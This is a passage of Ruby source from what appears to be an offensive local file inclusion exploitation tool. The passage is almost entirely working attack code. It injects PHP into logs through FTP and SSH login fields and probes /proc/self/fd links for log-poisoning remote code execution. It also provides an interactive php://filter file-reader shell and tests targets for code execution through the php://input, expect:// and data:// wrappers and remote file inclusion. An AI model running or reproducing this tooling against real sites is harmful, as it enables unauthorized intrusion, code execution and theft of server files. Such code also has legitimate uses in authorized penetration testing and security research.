						else
							@success = 'fail'
						end
						if not @success == 'fail'
							puts "[".light_green + "*".white + "] Appears to have been a successful injection".light_green + "!".white
							puts "[".light_green + "*".white + "] ".light_green + "#{@success}".white
							puts
							logprep_menu
						else
							puts "[".light_red + "X".white + "] Doesn't appear to be working".light_red + "!".white
							puts "[".light_red + "X".white + "] Always best to check manually to confirm, sorry".light_red + "....".white
							puts
							logprep_menu
						end
					when "3"
						#Method = FTP Login Based Injection
						puts "[".light_green + "*".white + "] Attempting to trigger FTP Login Based Injection".light_green + ".........".white
						@rnd = randz(5)
						@ftppayload = "<? echo ':'.'#{@rnd}:'.'working...check,check,1,2,3'.':#{@rnd}:'; ?>"
						ftpinject
						#check fd link to see if it worked!
						basicregex(@thegoods, 69)
						body = basicregex(@thegoods, 69)
						if body =~ /:#{@rnd}:(.+):#{@rnd}:/
							@success = $1 #make results available for injections using this one
						else
							@success = 'fail'
						end
						if not @success == 'fail'
							puts "[".light_green + "*".white + "] Appears to have been a successful injection via FTP Username Field".light_green + "!".white
							puts "[".light_green + "*".white + "] ".light_green + "#{@success}".white
							puts
							logprep_menu
						else
							puts "[".light_red + "X".white + "] Doesn't appear to be working".light_red + "!".white
							puts "[".light_red + "X".white + "] Always best to check manually to confirm, sorry".light_red + "....".white
							puts
							logprep_menu
						end
					when "4"
						#Method = SSH Login Based Injection
						puts "[".light_green + "*".white + "] Attempting to trigger SSH Login Based Injection".light_green + ".........".white
						@rnd = randz(5)
						@sshpayload = "<? echo ':'.'#{@rnd}:'.'working...check,check,1,2,3'.':#{@rnd}:'; ?>"
						sshinject
						#check fd link to see if it worked!
						basicregex(@thegoods, 69)
						body = basicregex(@thegoods, 69)
						if body =~ /:#{@rnd}:(.+):#{@rnd}:/
							@success = $1 #make results available for injections using this one
						else
							@success = 'fail'
						end
						if not @success == 'fail'
							puts "[".light_green + "*".white + "] Appears to have been a successful injection via SSH Username Field".light_green + "!".white
							puts "[".light_green + "*".white + "] ".light_green + "#{@success}".white
							puts
							puts
							logprep_menu
						else
							puts "[".light_red + "X".white + "] Doesn't appear to be working".light_red + "!".white
							puts "[".light_red + "X".white + "] Always best to check manually to confirm, sorry".light_red + "....".white
							puts
							logprep_menu
						end
					when "5"
						puts "[".light_yellow + "X".white + "] OK, Continuing with testing links where we left off".light_yellow + ".....".white
					else
						cls
						puts
						puts "Oops, Didn't quite understand that one".light_red + "!".white
						puts "Please Choose a Numbered Option From Below".light_red + ":".white
						puts
						logprep_menu
					end
			else
				puts "[".light_red + "X".white + "] OK, moving on then".light_red + ".....".white
			end
		end
	end

	def fdlinksinject(snum, fnum)
		#Run HTTP Request for /fd/x link, and look for regex in results
		#num => how high to search for fd/links to (i.e. /fd/0-x)
		filez = "proc/self/fd/"
		#####################################
		puts "[".light_green + "*".white + "] OK, Looking for ".light_green + "#{fnum.to_i - snum.to_i}".white + " links".light_green + ".......".white
		snum.to_i.upto(fnum.to_i) do |x|
			@x=x
			if $module_required['Min'].to_i == 0
				@thegoods="/#{filez}#{x}"
			else
				@thegoods="#{@stepstone}#{filez}#{x}"
			end
			rez = basicregex(@thegoods, 69)
		end
	end

	def fdlinksprep_menu
		if @found.to_i == 1
			puts "[".light_green + "*".white + "] Total Number of Possible File Descriptor Links: ".light_green + "#{@fdsize}".white
			puts "[".light_yellow + "*".white + "] Do you want to enumerate the full possible number of links".light_yellow + "?".white + " (".light_yellow + "Y".white + "/".light_yellow + "N".white + ")".light_yellow
			answer = gets.chomp
		else
			puts "[".light_red + "X".white + "] ".light_red + "/proc/self/status doesn't appear to have been found. Going to shoot in the dark, cross fingers, and hope for the best".light_yellow + ".....".white
			answer = "NO"
		end
		puts
		if "#{answer.upcase}" == "NO" or "#{answer.upcase}" == "N"
			puts "[".light_green + "*".white + "] OK".light_green + ",".white + " let's find out how many links you want to check".light_green + ".....".white
			puts
			puts "[".light_green + "*".white + "] Please enter the number for the option you want to try".light_green + ": ".white
			puts "0)".white + "   Return to Main Menu".light_green + "!".white
			puts "1)".white + "   Check First 32 Links (Recommended)".light_green
			puts "2)".white + "   Check First 64 Links".light_green
			puts "3)".white + "   Check First 150 Links".light_green
			puts "4)".white + "   User Supplied Number of Links".light_green
			case gets.chomp
				when "0"
					puts "[".light_red + "X".white + "] OK, Returning to Main Menu".light_red + "....".white
					cls
				when "1"
					@fdsize = 32
					fdlinksinject(0, @fdsize.to_i)
				when "2"
					@fdsize = 64
					fdlinksinject(0, @fdsize.to_i)
				when "3"
					@fdsize = 150
					fdlinksinject(0, @fdsize.to_i)
				when "4"
					puts "[".light_yellow + "*".white + "] OK, well how many links did you want to check then".light_yellow + "?".white
					@fdsize = gets.chomp
					fdlinksinject(0, @fdsize.to_i)
				else
					cls
					puts
					puts "Oops, Didn't quite understand that one".light_red + "!".white
					puts "Please Choose a Numbered Option From Below".light_red + ":".white
					puts
					fdlinksprep_menu
				end
		else
			fdlinksinject(0, @fdsize.to_i)
		end
	end

	def fdlinkz
		#Start Path to Injecting via /proc/self/fd/x links.....
		if @os.to_i == 0
			puts "[".light_red + "X".white + "] Your target appears to be Winblows".light_red + "!".white
			puts "[".light_red + "X".white + "] This option is only available for *nix targets".light_red + "!".white
		else
			puts "[".light_green + "*".white + "] Testing for ".light_green + "Log Files".white + " available via ".light_green + "/proc/self/fd/".white + " links for RCE via Log Poisoning".light_green + ".....".white

			if @fdsize.nil?
				@found = 0
				if $module_required['Min'].to_i == 0
					thegoods = "/proc/self/status"
					basicregex(thegoods, 69)
				else
					replacement = "#{@stepstone}proc/self/status"
					basicregex(thegoods, 69)
				end
			else
				puts "[".light_green + "*".white + "] Looks like /proc/self/status has already been found".light_green + "!".white
				puts "[".light_green + "*".white + "] Uid: ".light_green + "#{@uid}".white
				puts "[".light_green + "*".white + "] Gid: ".light_green + "#{@gid}".white
				puts "[".light_green + "*".white + "] Pid: ".light_green + "#{@pid}".white
				puts "[".light_green + "*".white + "] FDSize: ".light_green + "#{@fdsize}".white
				@found = 1
			end
			fdlinksprep_menu
		end
	end

	#Support for php://filters sudo shell file reader, loc-1=main, 2=mini
	def filters(location)
		cls
		puts "[".light_green + "*".white + "] Welcome to the ".light_green + "php://filters".white + " Source Disclosure/File Reader Shell".light_green
		puts "[".light_green + "*".white + "] Simply pass it the file to read ".light_green + "(".white + "path needed if not in current remote working directory".light_green + ")".white
		puts "[".light_green + "*".white + "] Keep in mind if PHP appendage is applied or not with how you enter file".light_green + ".....".white
		puts "\tEX: ".light_green + "index.php".white
		puts "\tEX: ".light_green + "index".white
		puts
		puts "[".light_red + "*".white + "] NOTE".light_red + ": ".white + "If you get duplicate results make the request again, working on that bug still, sorry".light_red + "...".white
		puts "[".light_green + "*".white + "] Type '".light_green + "EXIT".white + "' or '".light_green + "QUIT".white + "' to exit the shell".light_green
		puts
		puts "Dropping to File Reader Shell now".light_green + ".....".white

		while(true)
			prompt = "(php://filter)> "
			line = Readline.readline("#{prompt}", true)
			cmd = line.chomp
			thegoods = "php://filter/convert.base64-encode/resource=#{cmd}".chomp
			case cmd
			when /^exit|^quit/i
				puts "[".light_red + "X".white + "] OK, exiting ".light_red + "php://filters".white + " File Reader Shell session".light_red + "......".white
				puts "[".light_red + "X".white + "] Returning to Main Menu".light_red + "...".white
				break
			else
				if not $module_required['NullByte'].downcase == 'false'
					if $module_optional['Post'] == 'nil'
						funk = $module_required['Target'].sub("[LFI]", "#{thegoods}#{$nullbyte}").chomp
					else
						funk = $module_optional['Post'].sub("[LFI]", "#{thegoods}#{$nullbyte}").chomp
					end
				else
					if $module_optional['Post'] == 'nil'
						funk = $module_required['Target'].sub("[LFI]", "#{thegoods}").chomp
					else
						funk = $module_optional['Post'].sub("[LFI]", "#{thegoods}").chomp
					end
				end
				url = URI.encode(funk)
				if $module_optional['Post'] == 'nil'
					puts "[".light_yellow + "*".white + "] Testing".light_yellow + ": #{funk}".white
					rez = @http._get(url)
				else
					puts "[".light_yellow + "*".white + "] Testing".light_yellow + ": #{$module_required['Target']}".white
					puts "[".light_yellow + "*".white + "] Post data: ".light_yellow + "#{funk}".white
					rez = @http._post($module_required['Target'], url)
				end

				if rez[0] =~ /([A-Za-z0-9+\/]{8,}[A-Za-z0-9+\/]{1}|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{2}==)/
					checking = $1
					if checking =~ /([A-Za-z0-9+\/]{8,})/
						base64_str = $1
					end
					if not base64_str.nil?
						if base64_str.size > 5 #Get rid of false positives cause regex seems to match blanks in addition to base64 strings :(. This will consider anything less than 5 chars to be bogus. Not perfect, but should cover most cases for us....
							puts "[".light_green + "*".white + "] Appears to be working, found Base64 String in Response".light_green + "!".white
							base64_decoded_str = base64_str.base64dec
							puts "[".light_green + "*".white + "] Decoding response".green + "....".white
							puts "[".light_green + "*".white + "] Decoded: ".light_green
							puts "[".light_green + "*".white + "] #{base64_decoded_str}".cyan
						else
							puts "[".light_red + "X".white + "] Not finding any Base64 Strings in Response".light_red + "!".white
							puts "[".light_red + "X".white + "] It might not be working or requested file might not exist".light_red + ".....".white
							puts "[".light_red + "X".white + "] Try another file or confirm things manually".light_red + "....".white
							puts
						end
					else
						puts "[".light_red + "X".white + "] Not finding any Base64 Strings in Response".light_red + "!".white
						puts "[".light_red + "X".white + "] It might not be working or requested file might not exist".light_red + ".....".white
						puts "[".light_red + "X".white + "] Try another file or confirm things manually".light_red + "....".white
						puts
					end
				else
					puts "[".light_red + "X".white + "] Not finding any Base64 Strings in Response".light_red + "!".white
					puts "[".light_red + "X".white + "] It might not be working or requested file might not exist".light_red + ".....".white
					puts "[".light_red + "X".white + "] Try another file or confirm things manually".light_red + "....".white
					puts
				end
			end
			base64_str='' #So we dont get bogus results on partial matches due to how regex and variable setting seems to work, idk....
		end
	end

	#Support for php://input request building
	def inputinject(funk, payload)
		#Build a chambered decision driven request builder so we can keep it open to options :)
		puts "[".light_yellow + "*".white + "] Testing".light_yellow + ": #{funk}".white
		puts "[".light_yellow + "*".white + "] Post data: ".light_yellow + "#{payload}".white
		c = Curl::Easy.new(funk) do |curl|
			curl.useragent = 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)'
			if not $module_optional['ProxyIp'] == 'nil'
				if $module_optional['Auth'].to_i == 1
					#NO PASS CAN BE USED B/C basic_auth in use!
					curl.proxy_url = $module_optional['ProxyIp']
					curl.proxy_port = $module_optional['ProxyPort'].to_i
				else
					#CAN USE AUTH HERE
					if $module_optional['Username'] == 'nil'
						curl.proxy_url = $module_optional['ProxyIp']
						curl.proxy_port = $module_optional['ProxyPort'].to_i
					else
						curl.proxy_url = $module_optional['ProxyIp']
						curl.proxy_port = $module_optional['ProxyPort'].to_i
						curl.proxypwd = "#{$module_optional['Username']}:#{$module_optional['Password']}"
					end
				end
			end
			curl.cookies = $module_optional['Cookie'] unless $module_optional['Cookie'] == 'nil'
			if $module_optional['Auth'].to_i == 1
				curl.http_auth_types = :basic
				curl.username = $module_optional['Username']
				curl.password = $module_optional['Password']
			end

			curl.http_post(funk, "#{payload}")
		end
		foo=[]
		c.on_header do |x|
			foo << x# Collect our headers to enumerate in a minute
			x.size #keep curl from freaking out
		end
		c.perform
		#Successful injection will match our regex, failure won't (concat on exec proves its working)
		if c.body_str =~ /:#{@rnd}:(.+):#{@rnd}:/ 
			@success = $1 #make results available
		else
			@success = 'fail'
		end
	end

	#Base for php://input injection
	def input
		puts "[".light_green + "*".white + "] Testing for ".light_green + "php://input".white + " RCE Vuln".light_green + ".....".white
		if not $module_required['NullByte'].downcase == 'false'
			funk = $module_required['Target'].sub("[LFI]", "php://input#{$nullbyte}").chomp
		else
			funk = $module_required['Target'].sub("[LFI]", "php://input").chomp
		end
		@rnd = randz(5)
		payload = "<?echo \":\".\"#{@rnd}:\".\"working...check,check,1,2,3\".\":#{@rnd}:\";?>"
		inputinject(funk, payload)
		if not @success == 'fail'
			puts "[".light_green + "*".white + "] Mark Found".light_green + ": #{@success}".white
			puts "[".light_green + "*".white + "] w00t ".light_green + "-".white + " RCE achieved via php://input wrapper".light_green + "!".white
		else
			puts "[".light_red + "X".white + "] Site doesn't appear to be vulnerable to php://input wrapper method, sorry".light_red + "....".white
		end
	end

	def expectz
		puts "[".light_green + "*".white + "] Testing for ".light_green + "expect://".white + " RCE Vuln".light_green + ".....".white
		@rnd = randz(5)
		payload = "echo \":\"\"#{@rnd}:\"\"working...check,check,1,2,3\"\":#{@rnd}:\""
		thegoods = "expect://#{payload}"

		basicregex(thegoods, 69)

		if not @success == 'fail'
			puts "[".light_green + "*".white + "] Mark Found".light_green + ": #{@success}".white
			puts "[".light_green + "*".white + "] w00t ".light_green + "-".white + " RCE achieved via expect:// wrapper".light_green + "!".white
		else
			puts "[".light_red + "X".white + "] Site doesn't appear to be vulnerable to expect:// wrapper method, sorry".light_red + "....".white
		end
	end

	def datawrapper
		puts "[".light_green + "*".white + "] Testing for ".light_green + "data://".white + " RCE Vuln".light_green + ".....".white
		@rnd = randz(5)
		payload = "data://text/plain,<?php echo ':'.'#{@rnd}:'.'working...check,check,1,2,3'.':#{@rnd}'.':'; ?>"

		basicregex(payload, 69)

		if not @success == 'fail'
			puts "[".light_green + "*".white + "] Mark Found".light_green + ": #{@success}".white
			puts "[".light_green + "*".white + "] w00t ".light_green + "-".white + " RCE achieved via data:// wrapper".light_green + "!".white
		else
			puts "[".light_red + "X".white + "] Site doesn't appear to be vulnerable to data:// wrapper method, sorry".light_red + "....".white
		end
	end

	def rfi
		puts "[".light_green + "*".white + "] Testing for ".light_green + "Remote File Inclusion ".white + "(".cyan + "RFI".white + ")".cyan + " RCE Vulnerability".light_green + ".....".white
		if not $module_required['NullByte'].downcase == 'false'
			if $module_optional['Post'] == 'nil'
				funk = $module_required['Target'].sub("[LFI]", "#{$rfi}#{$nullbyte}").chomp
				puts "[".light_yellow + "*".white + "] Testing".light_yellow + ": #{funk}".white
			else
				funk = $module_optional['Post'].sub("[LFI]", "#{$rfi}#{$nullbyte}").chomp
				puts "[".light_yellow + "*".white + "] Testing".light_yellow + ": #{$module_required['Target']}".white
				puts "[".light_yellow + "*".white + "] Post data: ".light_yellow + "#{funk}".white

			end
		else
			if $module_optional['Post'] == 'nil'
				funk = $module_required['Target'].sub("[LFI]", "#{$rfi}").chomp
				puts "[".light_yellow + "*".white + "] Testing".light_yellow + ": #{funk}".white
			else
				funk = $module_optional['Post'].sub("[LFI]", "#{$rfi}").chomp
				puts "[".light_yellow + "*".white + "] Testing".light_yellow + ": #{$module_required['Target']}".white
				puts "[".light_yellow + "*".white + "] Post data: ".light_yellow + "#{funk}".white

			end
		end
		url = URI.encode(funk)
		if $module_optional['Post'] == 'nil'
			rez = @http._get(url)
		else
			rez = @http._post($module_required['Target'], url)
		end

		if rez[0] =~ /(RFI in the bag)/ 
			success = $1 #make results available
			puts "[".light_green + "*".white + "] Mark Found".light_green + ": #{success}".white
			puts "[".light_green + "*".white + "] w00t ".light_green + "-".white + " site is vuln to RFI attack".light_green + "!".white
		else
			puts "[".light_red + "X".white + "] Site doesn't appear to be vulnerable to RFI, sorry".light_red + ".......".white
		end
	end
end

FileIncluder.new
